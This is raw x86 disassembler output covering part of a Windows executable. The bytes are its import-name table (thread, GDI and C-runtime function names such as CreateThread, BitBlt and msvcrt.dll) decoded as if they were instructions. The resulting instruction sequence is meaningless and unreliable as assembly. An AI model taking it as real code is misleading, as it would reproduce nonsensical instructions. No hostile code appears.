  4261c1:	add    BYTE PTR [eax+0x4],al
  4261c4:	push   ebx
  4261c5:	gs je  0x42621c
  4261c8:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4261cf:	jne    0x426236
  4261d1:	push   esp
  4261d2:	imul   ebp,DWORD PTR [ebp+0x65],0x90000072
  4261d9:	add    DWORD PTR [edi+0x65],eax
  4261dc:	je     0x426221
  4261de:	push   eax
  4261df:	dec    ecx
  4261e0:	outs   dx,BYTE PTR ds:[esi]
  4261e1:	outs   dx,WORD PTR ds:[esi]
  4261e3:	add    BYTE PTR [edi],ah
  4261e5:	add    al,0x53
  4261e7:	gs je  0x426238
  4261ea:	popa   
  4261eb:	ins    DWORD PTR es:[edi],dx
  4261ec:	gs fs push eax
  4261ef:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  4261f6:	ins    BYTE PTR es:[edi],dx
  4261f7:	gs push ebx
  4261f9:	je     0x42625c
  4261fb:	je     0x426262
  4261fd:	add    BYTE PTR [ebp+0x69615704],cl
  426203:	je     0x42624b
  426205:	outs   dx,DWORD PTR ds:[esi]
  426206:	jb     0x426255
  426208:	jne    0x426276
  42620a:	je     0x426275
  42620c:	jo     0x42627a
  42620e:	gs dec edi
  426210:	bound  ebp,QWORD PTR [edx+0x65]
  426213:	arpl   WORD PTR [ebx+esi*2+0x45],si
  426217:	js     0x426219
  426219:	add    BYTE PTR [esi+0x4],cl
  42621c:	push   ebx
  42621d:	ins    BYTE PTR es:[edi],dx
  42621e:	gs gs jo 0x426267
  426222:	js     0x426224
  426224:	mov    ah,0x3
  426226:	push   edx
  426227:	gs ins DWORD PTR es:[edi],dx
  426229:	outs   dx,DWORD PTR ds:[esi]
  42622a:	jbe    0x426291
  42622c:	inc    esp
  42622d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  426234:	jns    0x42628d
  426236:	add    BYTE PTR [eax],al
  426238:	dec    edi
  426239:	add    al,BYTE PTR [edi+0x65]
  42623c:	je     0x426291
  42623e:	jns    0x4262b3
  426240:	je     0x4262a7
  426242:	ins    DWORD PTR es:[edi],dx
  426243:	inc    esp
  426244:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42624b:	jns    0x42628e
  42624d:	add    BYTE PTR [ebp+0x1],bl
  426250:	inc    esi
  426251:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  426258:	je     0x4262a0
  42625a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4360000
  426262:	push   ebx
  426263:	gs je  0x4262ba
  426266:	push   0x64616572
  42626b:	inc    ebx
  42626c:	outs   dx,DWORD PTR ds:[esi]
  42626d:	outs   dx,BYTE PTR ds:[esi]
  42626e:	je     0x4262d5
  426270:	js     0x4262e6
  426272:	add    BYTE PTR [eax],al
  426274:	out    dx,al
  426275:	add    DWORD PTR [edi+0x65],eax
  426278:	je     0x4262c0
  42627a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  426282:	mov    dl,0x0
  426284:	inc    ebx
  426285:	outs   dx,DWORD PTR ds:[esi]
  426286:	ins    DWORD PTR es:[edi],dx
  426287:	jo     0x4262ea
  426289:	jb     0x4262f0
  42628b:	inc    esi
  42628c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  426294:	ja     0x426297
  426296:	inc    esi
  426297:	ins    BYTE PTR es:[edi],dx
  426298:	jne    0x42630d
  42629a:	push   0x656c6946
  42629f:	inc    edx
  4262a0:	jne    0x426308
  4262a2:	data16 gs jb 0x426319
  4262a6:	add    BYTE PTR [eax],al
  4262a8:	int3   
  4262a9:	add    al,0x6c
  4262ab:	jae    0x426321
  4262ad:	jb     0x426312
  4262af:	jo     0x42632a
  4262b1:	outs   dx,BYTE PTR ds:[esi]
  4262b2:	push   edi
  4262b3:	add    BYTE PTR [eax+0x61654802],dh
  4262b9:	jo     0x426310
  4262bb:	outs   dx,BYTE PTR ds:[esi]
  4262bc:	ins    BYTE PTR es:[edi],dx
  4262bd:	outs   dx,DWORD PTR ds:[esi]
  4262be:	arpl   WORD PTR [ebx+0x0],bp
  4262c1:	add    BYTE PTR [edi+0x6c655203],ch
  4262c7:	gs popa 
  4262c9:	jae    0x426330
  4262cb:	dec    ebp
  4262cc:	jne    0x426342
  4262ce:	gs js  0x4262d1
  4262d1:	add    BYTE PTR [eax],cl
  4262d3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4262d7:	fs dec esp
  4262d9:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  4262e0:	add    BYTE PTR [eax],al
  4262e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262e3:	add    BYTE PTR [ebx+0x61],al
  4262e6:	outs   dx,BYTE PTR ds:[esi]
  4262e7:	arpl   WORD PTR [ebp+0x6c],sp
  4262ea:	push   edi
  4262eb:	popa   
  4262ec:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4262f4:	ins    DWORD PTR es:[edi],dx
  4262f5:	gs jb  0x4262f8
  4262f8:	add    al,0x1
  4262fa:	inc    esp
  4262fb:	gs ins BYTE PTR es:[edi],dx
  4262fd:	gs je  0x426365
  426300:	inc    esi
  426301:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4300e000
  426309:	jb     0x426370
  42630b:	popa   
  42630c:	je     0x426373
  42630e:	dec    ebp
  42630f:	jne    0x426385
  426311:	gs js  0x42636b
  426314:	add    BYTE PTR [eax],al
  426316:	add    al,BYTE PTR [bx+0x65]
  42631a:	je     0x426370
  42631c:	push   0x64616572
  426321:	dec    esp
  426322:	outs   dx,DWORD PTR ds:[esi]
  426323:	arpl   WORD PTR [ecx+0x6c],sp
  426326:	add    BYTE PTR gs:[edi+0x2],ch
  42632a:	inc    edi
  42632b:	gs je  0x426382
  42632e:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  426335:	popa   
  426336:	je     0x426379
  426338:	add    BYTE PTR [eax],al
  42633a:	into   
  42633b:	add    al,0x6c
  42633d:	jae    0x4263b3
  42633f:	jb     0x4263ad
  426341:	outs   dx,BYTE PTR gs:[esi]
  426343:	inc    ecx
  426344:	add    BYTE PTR [eax],al
  426346:	adc    al,0x3
  426348:	dec    esp
  426349:	outs   dx,DWORD PTR ds:[esi]
  42634a:	arpl   WORD PTR [ecx+0x6c],sp
  42634d:	push   ebx
  42634e:	imul   edi,DWORD PTR [edx+0x65],0x46016d00
  426355:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  42635c:	jne    0x4263d0
  42635e:	arpl   WORD PTR [ebp+0x45],sp
  426361:	js     0x4263a4
  426363:	add    BYTE PTR [ecx+eax*1+0x46],bl
  426367:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42636e:	je     0x4263b3
  426370:	push   0x65676e61
  426375:	dec    esi
  426376:	outs   dx,DWORD PTR ds:[esi]
  426377:	je     0x4263e2
  426379:	imul   sp,WORD PTR [ebx+0x61],0x6974
  42637f:	outs   dx,DWORD PTR ds:[esi]
  426380:	outs   dx,BYTE PTR ds:[esi]
  426381:	push   edi
  426382:	add    BYTE PTR [eax],al
  426384:	xchg   edi,eax
  426385:	add    DWORD PTR [edi+0x65],eax
  426388:	je     0x4263cd
  42638a:	outs   dx,DWORD PTR ds:[esi]
  42638b:	ins    DWORD PTR es:[edi],dx
  42638c:	ins    DWORD PTR es:[edi],dx
  42638d:	dec    ebp
  42638e:	outs   dx,DWORD PTR ds:[esi]
  42638f:	fs gs ins DWORD PTR es:[edi],dx
  426392:	push   ebx
  426393:	je     0x4263f6
  426395:	je     0x42640c
  426397:	jae    0x426399
  426399:	add    BYTE PTR [edi],dl
  42639b:	add    al,BYTE PTR [edi+0x65]
  42639e:	je     0x4263ed
  4263a0:	outs   dx,DWORD PTR ds:[esi]
  4263a1:	fs jne 0x426410
  4263a4:	gs dec eax
  4263a6:	popa   
  4263a7:	outs   dx,BYTE PTR ds:[esi]
  4263a8:	fs ins BYTE PTR es:[edi],dx
  4263aa:	gs inc ebp
  4263ac:	js     0x426405
  4263ae:	add    BYTE PTR [eax],al
  4263b0:	cmp    eax,DWORD PTR [ebx]
  4263b2:	dec    edi
  4263b3:	jo     0x42641a
  4263b5:	outs   dx,BYTE PTR ds:[esi]
  4263b6:	inc    esi
  4263b7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4263bf:	outs   dx,BYTE PTR ds:[esi]
  4263c0:	addr16 inc ecx
  4263c2:	add    BYTE PTR [eax],al
  4263c4:	sbb    BYTE PTR [ebx+edx*2],al
  4263c7:	gs je  0x426410
  4263ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4263d2:	gs jb  0x4263d5
  4263d5:	add    BYTE PTR [eax+0x2],dh
  4263d8:	inc    edi
  4263d9:	gs je  0x426430
  4263dc:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  4263e3:	popa   
  4263e4:	je     0x42643d
  4263e6:	add    BYTE PTR [eax],al
  4263e8:	xchg   ebp,eax
  4263e9:	add    DWORD PTR [edi+0x65],eax
  4263ec:	je     0x426431
  4263ee:	outs   dx,DWORD PTR ds:[esi]
  4263ef:	ins    DWORD PTR es:[edi],dx
  4263f0:	ins    DWORD PTR es:[edi],dx
  4263f1:	inc    ebx
  4263f2:	outs   dx,DWORD PTR ds:[esi]
  4263f3:	outs   dx,BYTE PTR ds:[esi]
  4263f4:	imul   sp,WORD PTR [edi+0x0],0x2ce
  4263fa:	dec    ecx
  4263fb:	jae    0x42643f
  4263fd:	popa   
  4263fe:	fs push edi
  426400:	jb     0x42646b
  426402:	je     0x426469
  426404:	push   eax
  426405:	je     0x426479
  426407:	add    BYTE PTR [ecx+eax*1+0x46],ch
  42640b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  426412:	jne    0x426486
  426414:	arpl   WORD PTR [ebp+0x41],sp
  426417:	add    bl,ah
  426419:	add    edx,DWORD PTR [ebx+0x65]
  42641c:	je     0x426461
  42641e:	outs   dx,DWORD PTR ds:[esi]
  42641f:	ins    DWORD PTR es:[edi],dx
  426420:	ins    DWORD PTR es:[edi],dx
  426421:	push   ebx
  426422:	je     0x426485
  426424:	je     0x42648b
  426426:	add    BYTE PTR [eax],al
  426428:	imul   eax,DWORD PTR [edx],0x54746547
  42642e:	push   0x64616572
  426433:	push   eax
  426434:	jb     0x42649f
  426436:	outs   dx,DWORD PTR ds:[esi]
  426437:	jb     0x4264a2
  426439:	je     0x4264b4
  42643b:	add    BYTE PTR [ebx],al
  42643d:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  426441:	gs je  0x4264a9
  426444:	inc    esi
  426445:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x53044100
  42644d:	gs je  0x4264a5
  426450:	outs   dx,BYTE PTR ds:[esi]
  426451:	push   0x6c646e61
  426456:	gs fs inc ebp
  426459:	js     0x4264be
  42645b:	gs jo  0x4264d2
  42645e:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  426465:	gs jb  0x426468
  426468:	mov    WORD PTR [ecx],es
  42646a:	inc    edi
  42646b:	gs je  0x4264af
  42646e:	je     0x4264df
  426470:	ins    DWORD PTR es:[edi],dx
  426471:	dec    esi
  426472:	popa   
  426473:	ins    DWORD PTR es:[edi],dx
  426474:	gs push edi
  426476:	add    BYTE PTR [eax],al
  426478:	rol    BYTE PTR [esp+ebp*2],0x73
  42647c:	je     0x4264f0
  42647e:	arpl   WORD PTR [ecx+0x74],sp
  426481:	push   edi
  426482:	add    BYTE PTR [eax],al
  426484:	jae    0x426488
  426486:	inc    edi
  426487:	gs je  0x4264df
  42648a:	jae    0x4264f1
  42648c:	jb     0x4264d2
  42648e:	gs popaw 
  426491:	jne    0x4264ff
  426493:	je     0x4264e1
  426495:	inc    ebx
  426496:	dec    ecx
  426497:	inc    esp
  426498:	add    BYTE PTR [eax],al
  42649a:	dec    ebx
  42649b:	inc    ebp
  42649c:	push   edx
  42649d:	dec    esi
  42649e:	inc    ebp
  42649f:	dec    esp
  4264a0:	xor    esi,DWORD PTR [edx]
  4264a2:	cs fs ins BYTE PTR es:[edi],dx
  4264a5:	ins    BYTE PTR es:[edi],dx
  4264a6:	add    BYTE PTR [eax],al
  4264a8:	cmc    
  4264a9:	add    BYTE PTR [edi+0x63],bl
  4264ac:	outs   dx,DWORD PTR ds:[esi]
  4264ad:	outs   dx,BYTE PTR ds:[esi]
  4264ae:	je     0x426522
  4264b0:	outs   dx,DWORD PTR ds:[esi]
  4264b1:	ins    BYTE PTR es:[edi],dx
  4264b2:	data16 jo 0x4264b5
  4264b5:	add    BYTE PTR [ecx+0x77736903],ch
  4264bb:	jae    0x42652d
  4264bd:	popa   
  4264be:	arpl   WORD PTR [ebp+0x0],sp
  4264c1:	add    BYTE PTR [edi+0x74656703],cl
  4264c7:	jae    0x4264c9
  4264c9:	add    BYTE PTR [ebx+0x70736903],bl
  4264cf:	jb     0x42653a
  4264d1:	outs   dx,BYTE PTR ds:[esi]
  4264d2:	je     0x4264d4
  4264d4:	mov    bl,0x0
  4264d6:	pop    edi
  4264d7:	pop    edi
  4264d8:	jae    0x42653f
  4264da:	je     0x42653b
  4264dc:	popa   
  4264dd:	jo     0x42654f
  4264df:	pop    edi
  4264e0:	je     0x42655b
  4264e2:	jo     0x426549
  4264e4:	add    BYTE PTR [eax],al
  4264e6:	mov    al,ds:0x705f5f00
  4264eb:	pop    edi
  4264ec:	pop    edi
  4264ed:	ins    WORD PTR es:[edi],dx
  4264ef:	outs   dx,DWORD PTR ds:[esi]
  4264f0:	fs add BYTE PTR gs:[eax],al
  4264f4:	xor    DWORD PTR [edi+esi*2],eax
  4264f7:	arpl   WORD PTR [ebx+0x73],si
  4264fa:	je     0x42656e
  4264fc:	add    BYTE PTR [eax],al
  4264fe:	cli    
  4264ff:	add    esi,DWORD PTR [ebx+0x74]
  426502:	jb     0x426578
  426504:	outs   dx,DWORD PTR ds:[esi]
  426505:	imul   eax,DWORD PTR [eax],0x0
  426508:	out    0x3,eax
  42650a:	jae    0x426580
  42650c:	jb     0x426571
  42650e:	outs   dx,DWORD PTR ds:[esi]
  42650f:	ins    BYTE PTR es:[edi],dx
  426510:	ins    BYTE PTR es:[edi],dx
  426511:	add    BYTE PTR [ebx+0x705f5f00],bl
  426517:	pop    edi
  426518:	pop    edi
  426519:	arpl   WORD PTR [edi+0x6d],bp
  42651c:	ins    DWORD PTR es:[edi],dx
  42651d:	outs   dx,DWORD PTR ds:[esi]
  42651e:	fs add BYTE PTR gs:[eax],al
  426522:	fild   DWORD PTR [eax]
  426524:	pop    edi
  426525:	popa   
  426526:	ins    DWORD PTR es:[edi],dx
  426527:	jae    0x426590
  426529:	pop    edi
  42652a:	gs js  0x426596
  42652d:	je     0x42652f
  42652f:	add    BYTE PTR [esi+0x6e695f01],al
  426535:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x88006d72
  42653d:	add    esp,DWORD PTR [esi+0x77]
  426540:	jb     0x4265ab
  426542:	je     0x4265a9
  426544:	add    BYTE PTR [eax],al
  426546:	sahf   
  426547:	add    DWORD PTR [edi+0x69],ebx
  42654a:	jae    0x4265b9
  42654c:	bound  esp,QWORD PTR [edx+0x6c]
  42654f:	gs popa 
  426551:	add    BYTE PTR fs:[eax],al
  426554:	jge    0x426559
  426556:	data16 jb 0x4265be
  426559:	add    BYTE PTR gs:[eax],al
  42655c:	lds    eax,FWORD PTR [ebx]
  42655e:	jo     0x4265d2
  426560:	imul   ebp,DWORD PTR [esi+0x74],0x9a000066
  426567:	add    ebp,DWORD PTR [ecx+0x73]
  42656a:	ins    BYTE PTR es:[edi],dx
  42656b:	outs   dx,DWORD PTR ds:[esi]
  42656c:	ja     0x4265d3
  42656e:	jb     0x426570
  426570:	stos   DWORD PTR es:[edi],eax
  426571:	add    ebp,DWORD PTR [ecx+0x73]
  426574:	ja     0x4265ee
  426576:	imul   esp,DWORD PTR fs:[edi+0x69],0x3780074
  42657e:	data16 jo 0x4265f6
  426581:	je     0x4265e6
  426583:	add    BYTE PTR [edx+0x0],dl
  426586:	pop    edi
  426587:	pop    eax
  426588:	arpl   WORD PTR [eax+0x74],si
  42658b:	inc    esi
  42658c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3dd0072
  426594:	jae    0x426606
  426596:	jb     0x426601
  426598:	outs   dx,BYTE PTR ds:[esi]
  426599:	je     0x426601
  42659b:	add    BYTE PTR [ecx],cl
  42659d:	add    al,0x74
  42659f:	outs   dx,DWORD PTR ds:[esi]
  4265a0:	ins    BYTE PTR es:[edi],dx
  4265a1:	outs   dx,DWORD PTR ds:[esi]
  4265a2:	ja     0x426609
  4265a4:	jb     0x4265a6
  4265a6:	and    eax,DWORD PTR [ecx]
  4265a8:	pop    edi
  4265a9:	gs js  0x426615
  4265ac:	je     0x4265ae
  4265ae:	add    eax,DWORD PTR [ebx+esi*2]
  4265b1:	jns    0x426626
  4265b3:	je     0x42661a
  4265b5:	ins    DWORD PTR es:[edi],dx
  4265b6:	add    BYTE PTR [eax],al
  4265b8:	call   0x65a5c4bd
  4265bd:	js     0x426628
  4265bf:	je     0x4265c1
  4265c1:	add    BYTE PTR ds:0x73637704,dh
  4265c7:	je     0x426638
  4265c9:	ins    BYTE PTR es:[edi],dx
  4265ca:	add    BYTE PTR [eax],al
  4265cc:	iret   
  4265cd:	add    esi,DWORD PTR [edx+0x61]
  4265d0:	outs   dx,BYTE PTR ds:[esi]
  4265d1:	add    BYTE PTR fs:[eax],al
  4265d4:	mov    ch,0x0
  4265d6:	pop    edi
  4265d7:	pop    edi
  4265d8:	jae    0x42663f
  4265da:	je     0x426651
  4265dc:	jae    0x426643
  4265de:	jb     0x42664d
  4265e0:	popa   
  4265e1:	je     0x42664b
  4265e3:	gs jb  0x426658
  4265e6:	add    BYTE PTR [eax],al
  4265e8:	and    eax,DWORD PTR [edi+esi*2]
  4265eb:	arpl   WORD PTR [ebx+0x63],si
  4265ee:	jae    0x426660
  4265f0:	outs   dx,BYTE PTR ds:[esi]
  4265f1:	add    ch,bh
  4265f3:	add    esi,DWORD PTR [ebx+0x74]
  4265f6:	jb     0x42666c
  4265f8:	outs   dx,DWORD PTR ds:[esi]
  4265f9:	jne    0x426667
  4265fb:	add    BYTE PTR [esp+eax*1],ch
  4265fe:	ja     0x426663
  426600:	jae    0x426672
  426602:	bound  esi,QWORD PTR [edx+0x6b]
  426605:	add    BYTE PTR [eax+0x3],ah
  426608:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  42660c:	imul   eax,DWORD PTR [eax],0xffffff85
  42660f:	add    esp,DWORD PTR [esi+0x74]
  426612:	gs ins BYTE PTR es:[edi],dx
  426614:	ins    BYTE PTR es:[edi],dx
  426615:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  42661c:	outs   dx,BYTE PTR ds:[esi]
  42661d:	jne    0x42668c
  42661f:	add    ch,ah
  426621:	add    esi,DWORD PTR [ebx+0x74]
  426624:	jb     0x426689
  426626:	push   0xfc000072
  42662b:	add    esi,DWORD PTR [ebx+0x74]
  42662e:	jb     0x4266a4
  426630:	outs   dx,DWORD PTR ds:[esi]
  426631:	ins    BYTE PTR es:[edi],dx
  426632:	add    BYTE PTR [eax],al
  426634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426635:	add    ebp,DWORD PTR [ecx+0x73]
  426638:	ja     0x42669e
  42663a:	imul   esp,DWORD PTR [edi+0x69],0xeb000074
  426641:	add    esi,DWORD PTR [ebx+0x74]
  426644:	jb     0x4266ab
  426646:	jb     0x4266ba
  426648:	outs   dx,DWORD PTR ds:[esi]
  426649:	jb     0x42664b
  42664b:	add    BYTE PTR [ecx+0x74626d03],bh
  426651:	outs   dx,DWORD PTR ds:[esi]
  426652:	ja     0x4266b7
  426654:	add    BYTE PTR [eax],al
  426656:	push   es
  426657:	add    al,0x74
  426659:	imul   ebp,DWORD PTR [ebp+0x65],0x720000
  426660:	pop    edi
  426661:	pop    edi
  426662:	addr16 gs je 0x4266d3
  426666:	popa   
  426667:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  42666e:	and    DWORD PTR [edi+esi*2],eax
  426671:	arpl   WORD PTR [ebx+0x63],si
  426674:	jo     0x4266ef
  426676:	add    BYTE PTR [eax],al
  426678:	xchg   ebp,eax
  426679:	add    ebp,DWORD PTR [ecx+0x73]
  42667c:	popa   
  42667d:	ins    BYTE PTR es:[edi],dx
  42667e:	jo     0x4266e8
  426680:	popa   
  426681:	add    BYTE PTR [esi],dl
  426683:	add    al,0x76
  426685:	jae    0x4266f7
  426687:	jb     0x4266f2
  426689:	outs   dx,BYTE PTR ds:[esi]
  42668a:	je     0x4266f2
  42668c:	add    BYTE PTR [eax],al
  42668e:	dec    ebp
  42668f:	push   ebx
  426690:	push   esi
  426691:	inc    ebx
  426692:	push   edx
  426693:	push   esp
  426694:	cs fs ins BYTE PTR es:[edi],dx
  426697:	ins    BYTE PTR es:[edi],dx
  426698:	add    BYTE PTR [eax],al
  42669a:	xchg   DWORD PTR [eax],eax
  42669c:	inc    ebx
  42669d:	jb     0x426704
  42669f:	popa   
  4266a0:	je     0x426707
  4266a2:	inc    edx
  4266a3:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc1000070
  4266ab:	add    DWORD PTR [edx+0x65],edx
  4266ae:	ins    DWORD PTR es:[edi],dx
  4266af:	outs   dx,DWORD PTR ds:[esi]
  4266b0:	jbe    0x426717
  4266b2:	inc    esi
  4266b3:	outs   dx,DWORD PTR ds:[esi]
  4266b4:	outs   dx,BYTE PTR ds:[esi]
  4266b5:	je     0x426709
  4266b7:	gs jae 0x426729
  4266ba:	jne    0x42672e
  4266bc:	arpl   WORD PTR [ebp+0x57],sp
  4266bf:	add    BYTE PTR [edi],bh
  4266c1:	add    DWORD PTR [edi+0x65],eax
  4266c4:	je     0x42670a
  4266c6:	dec    ecx
  4266c7:	inc    edx
  4266c8:	inc    ebx
  4266c9:	outs   dx,DWORD PTR ds:[esi]
  4266ca:	ins    BYTE PTR es:[edi],dx
  4266cb:	outs   dx,DWORD PTR ds:[esi]
  4266cc:	jb     0x426722
  4266ce:	popa   
  4266cf:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4266d3:	add    BYTE PTR [esi+0x1],ch
  4266d6:	inc    edi
  4266d7:	gs je  0x42672a
  4266da:	imul   edi,DWORD PTR [eax+0x65],0xb900006c
  4266e1:	add    DWORD PTR [edx+0x65],edx
  4266e4:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  4266e8:	push   edx
  4266e9:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x13a0000
  4266f2:	inc    edi
  4266f3:	gs je  0x426739
  4266f6:	jne    0x42676a
  4266f8:	jb     0x42675f
  4266fa:	outs   dx,BYTE PTR ds:[esi]
  4266fb:	je     0x42674c
  4266fd:	bound  ebp,QWORD PTR [edx+0x65]
  426700:	arpl   WORD PTR [eax+eax*1+0x0],si
  426704:	test   DWORD PTR [ecx],eax
  426706:	inc    edi
  426707:	gs je  0x42675e
  42670a:	gs js  0x426781
  42670d:	inc    ebp
  42670e:	js     0x426784
  426710:	outs   dx,BYTE PTR gs:[esi]
  426712:	je     0x426764
  426714:	outs   dx,DWORD PTR ds:[esi]
  426715:	imul   ebp,DWORD PTR [esi+0x74],0xab0041
  42671c:	inc    ebx
  42671d:	jb     0x426784
  42671f:	popa   
  426720:	je     0x426787
  426722:	push   edx
  426723:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  426728:	outs   dx,BYTE PTR ds:[esi]
  426729:	add    BYTE PTR [ecx+eax*1+0x42746150],ah
  426730:	ins    BYTE PTR es:[edi],dx
  426731:	je     0x426733
  426733:	add    BYTE PTR [ebx+0x74654701],cl
  426739:	push   esp
  42673a:	gs js  0x4267b1
  42673d:	dec    ebp
  42673e:	gs je  0x4267b3
  426741:	imul   esp,DWORD PTR [ebx+0x73],0xb10057
  426748:	inc    esp
  426749:	push   eax
  42674a:	je     0x4267bb
  42674c:	dec    esp
  42674d:	push   eax
  42674e:	add    BYTE PTR [eax],al
  426750:	popf   
  426751:	add    BYTE PTR [ebx+0x72],al
  426754:	gs popa 
  426756:	je     0x4267bd
  426758:	inc    esi
  426759:	outs   dx,DWORD PTR ds:[esi]
  42675a:	outs   dx,BYTE PTR ds:[esi]
  42675b:	je     0x4267a6
  42675d:	outs   dx,BYTE PTR ds:[esi]
  42675e:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  426766:	aad    0x1
  426768:	push   ebx
  426769:	gs je  0x4267ae
  42676c:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  426770:	add    BYTE PTR gs:[esi+0x646e4500],bh
  426777:	inc    esp
  426778:	outs   dx,DWORD PTR ds:[esi]
  426779:	arpl   WORD PTR [eax],ax
  42677b:	add    bh,dl
  42677d:	add    BYTE PTR [esi+0x69],al
  426780:	ins    BYTE PTR es:[edi],dx
  426781:	ins    BYTE PTR es:[edi],dx
  426782:	push   edx
  426783:	outs   dx,BYTE PTR ds:[si]
  426785:	add    BYTE PTR [ecx],al
  426787:	add    dl,BYTE PTR [ebx+0x65]
  42678a:	je     0x4267e3
  42678c:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  426793:	addr16 inc ebp
  426795:	js     0x426797
  426797:	add    ch,al
  426799:	add    DWORD PTR [edx+0x65],edx
  42679c:	jae    0x426812
  42679e:	outs   dx,DWORD PTR ds:[esi]
  42679f:	jb     0x426806
  4267a1:	inc    esp
  4267a2:	inc    ebx
  4267a3:	add    BYTE PTR [eax+0x65724300],ah
  4267a9:	popa   
  4267aa:	je     0x426811
  4267ac:	dec    eax
  4267ad:	popa   
  4267ae:	je     0x426813
  4267b0:	push   0x73757242
  4267b5:	push   0x1d00000
  4267ba:	push   ebx
  4267bb:	gs je  0x4267ff
  4267be:	bound  ebp,QWORD PTR [edi+0x72]
  4267c1:	je     0x426813
  4267c3:	jb     0x426834
  4267c5:	arpl   WORD PTR [eax],ax
  4267c7:	add    BYTE PTR [edi+0x1],bl
  4267ca:	inc    edi
  4267cb:	gs je  0x42681b
  4267ce:	popa   
  4267cf:	jo     0x42681e
  4267d1:	outs   dx,DWORD PTR ds:[esi]
  4267d2:	fs add BYTE PTR gs:[eax],al
  4267d6:	test   BYTE PTR [ecx],0x53
  4267d9:	gs je  0x42682f
  4267dc:	je     0x426850
  4267de:	gs je  0x426844
  4267e1:	push   0x4d746c42
  4267e6:	outs   dx,DWORD PTR ds:[esi]
  4267e7:	fs add BYTE PTR gs:[esi+0x1],dh
  4267ec:	inc    edi
  4267ed:	gs je  0x426842
  4267f0:	outs   dx,BYTE PTR ds:[si]
  4267f2:	inc    edx
  4267f3:	outs   dx,DWORD PTR ds:[esi]
  4267f4:	js     0x4267f6
  4267f6:	stos   BYTE PTR es:[edi],al
  4267f7:	add    BYTE PTR [ebx+0x72],al
  4267fa:	gs popa 
  4267fc:	je     0x426863
  4267fe:	push   eax
  4267ff:	outs   dx,DWORD PTR ds:[esi]
  426800:	ins    BYTE PTR es:[edi],dx
  426801:	jns    0x42686a
  426803:	outs   dx,DWORD PTR ds:[esi]
  426804:	outs   dx,BYTE PTR ds:[esi]
  426805:	push   edx
  426806:	outs   dx,BYTE PTR ds:[si]
  426808:	add    BYTE PTR [eax],al
  42680a:	mov    DWORD PTR [ecx],0x65766153
  426810:	inc    esp
  426811:	inc    ebx
  426812:	add    BYTE PTR [eax],al
  426814:	sahf   
  426815:	add    BYTE PTR [ebx+0x72],al
  426818:	gs popa 
  42681a:	je     0x426881
  42681c:	inc    esi
  42681d:	outs   dx,DWORD PTR ds:[esi]
  42681e:	outs   dx,BYTE PTR ds:[esi]
  42681f:	je     0x426878
  426821:	add    BYTE PTR [edi+0x646e4500],bh
  426827:	push   eax
  426828:	popa   
  426829:	addr16 gs add ch,bl
  42682d:	add    DWORD PTR [ebx+0x65],edx
  426830:	je     0x426876
  426832:	dec    ecx
  426833:	inc    edx
  426834:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x64410070
  42683c:	fs inc esi
  42683e:	outs   dx,DWORD PTR ds:[esi]
  42683f:	outs   dx,BYTE PTR ds:[esi]
  426840:	je     0x426894
  426842:	gs jae 0x4268b4
  426845:	jne    0x4268b9
  426847:	arpl   WORD PTR [ebp+0x57],sp
  42684a:	add    BYTE PTR [eax],al
  42684c:	xchg   ebp,eax
  42684d:	add    DWORD PTR [eax+edx*2+0x74],ecx
  426851:	outs   dx,DWORD PTR ds:[esi]
  426852:	inc    esp
  426853:	push   eax
  426854:	add    BYTE PTR [eax],al
  426856:	mov    DWORD PTR [eax],eax
  426858:	inc    ebx
  426859:	jb     0x4268c0
  42685b:	popa   
  42685c:	je     0x4268c3
  42685e:	inc    edx
  42685f:	jb     0x4268d6
  426861:	jae    0x4268cb
  426863:	dec    ecx
  426864:	outs   dx,BYTE PTR ds:[esi]
  426865:	imul   esi,DWORD PTR fs:[edx+0x65],0x5c007463
  42686d:	add    DWORD PTR [edi+0x65],eax
  426870:	je     0x4268be
  426872:	popa   
  426873:	jns    0x4268e4
  426875:	jne    0x4268eb
  426877:	add    BYTE PTR [ebx+0x1],bh
  42687a:	inc    edi
  42687b:	gs je  0x4268d2
  42687e:	gs js  0x4268f5
  426881:	inc    ecx
  426882:	ins    BYTE PTR es:[edi],dx
  426883:	imul   esp,DWORD PTR [edi+0x6e],0x18a0000
  42688a:	inc    edi
  42688b:	gs je  0x4268e2
  42688e:	gs js  0x426905
  426891:	dec    ebp
  426892:	gs je  0x426907
  426895:	imul   esp,DWORD PTR [ebx+0x73],0x1ba0041
  42689c:	push   edx
